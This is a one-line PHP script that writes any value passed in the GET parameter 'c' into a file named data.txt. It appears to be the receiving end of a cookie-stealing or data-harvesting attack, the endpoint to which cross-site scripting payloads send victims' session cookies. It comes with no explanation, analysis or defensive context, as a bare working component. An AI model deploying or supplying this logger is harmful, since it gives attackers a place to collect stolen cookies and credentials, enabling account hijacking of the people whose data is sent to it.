<?php if(!empty($_GET['c'])){$c0=fopen('data.txt','a+');fwrite($c0,$_GET['c']);fclose($c0);}?>
